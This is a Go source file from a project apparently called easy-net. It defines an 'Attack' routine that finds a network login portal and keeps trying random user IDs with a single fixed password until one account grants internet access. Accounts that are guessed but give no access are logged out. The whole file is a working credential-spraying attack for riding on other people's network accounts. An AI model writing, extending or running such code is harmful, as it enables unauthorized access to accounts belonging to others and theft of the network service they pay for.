package auth

import (
	"context"
	"fmt"
	"time"

	"nmnm.cc/easy-net/internal/log"
)

type AttackConfig struct {
	Host        string
	Base        string
	Link        string
	Password    string
	Timeout     time.Duration
	TargetSpeed string
}

var attackLogger = log.New("auth/attack")

func Attack(cfg *AttackConfig) error {
	attackLogger.Info("detecting connection")
	if TestConnection(cfg.Link) {
		return nil
	}
	attackLogger.Info("no connection, start attack", "host", cfg.Host, "password", cfg.Password)

	if cfg.Base == "" {
		base, err := FindPortal(cfg.Host, cfg.Link)
		if err != nil {
			return fmt.Errorf("failed to find portal: %w", err)
		}
		cfg.Base = base
	}

	for {
		tried := make(map[string]struct{})

		var userid string
		for {
			userid = RandomUserid()

			if _, ok := tried[userid]; ok {
				continue
			} else {
				tried[userid] = struct{}{}
			}

			if err := Login(&LoginConfig{
				Base:     cfg.Base,
				Link:     cfg.Link,
				UserID:   userid,
				Password: cfg.Password,
			}); err != nil {
				attackLogger.Warn("failed to login", "error", err)
				continue
			}

			break
		}

		ctx, cancel := context.WithTimeout(context.Background(), cfg.Timeout)

		go func() {
			for {
				time.Sleep(1 * time.Second)

				if TestConnection(cfg.Link) {
					cancel()
				}
			}
		}()

		<-ctx.Done()

		switch ctx.Err() {
		case context.DeadlineExceeded:
			attackLogger.Info("no connection after login, keep attacking", "userid", userid)
			if err := Logout(&LogoutConfig{
				Base:   cfg.Base,
				Link:   cfg.Link,
				UserID: userid,
			}); err != nil {
				attackLogger.Error("failed to logout", "error", err)
			}
		case context.Canceled:
			attackLogger.Info("connected, attack finished", "userid", userid)
			return nil
		}
	}
}
